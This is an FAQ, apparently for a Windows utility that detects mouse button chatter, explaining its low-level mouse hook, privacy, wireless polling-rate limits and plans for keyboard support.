Left click double clicks | Recorder, Intervals threshold |
Does the double-click speed slider in Windows fix it?
No. That slider decides how close two clicks must be to count as a double-click; it cannot tell a ghost from a real click. Making it faster can hide some double-opens in Explorer but does nothing for drags, games or text selection.
Is it safe? Is a mouse hook a keylogger?
The hook is a mouse hook only (`WH_MOUSE_LL`); there is no keyboard hook. It looks at button events and their timing, keeps counters, and stores nothing about where you clicked. The source is here to read, and there is no network code.
Does it work with wireless and Bluetooth mice?
Yes. The test works with any mouse Windows sees. Timing precision depends on the polling rate: at 1000 Hz each report is 1 ms apart, at 125 Hz 8 ms. Bounces shorter than one report can be invisible to any software, so a slow wireless or Bluetooth link may under-count chatter.
Can I fix keyboard chatter too?
Not yet. It is on the roadmap.
